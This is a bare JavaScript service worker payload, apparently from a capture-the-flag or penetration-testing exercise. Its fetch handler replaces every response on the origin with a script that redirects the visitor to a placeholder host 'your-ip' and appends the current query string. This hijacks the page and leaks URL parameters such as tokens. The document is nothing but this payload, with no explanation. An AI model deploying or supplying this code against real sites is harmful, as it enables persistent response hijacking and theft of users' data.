this.addEventListener('fetch', function (event) {
    var body = "<script>location='http://your-ip/'+location.search;</script>";
    var init = {headers: {"Content-Type": "text/html"}};
    var res = new Response(body, init);
    event.respondWith(res.clone());
});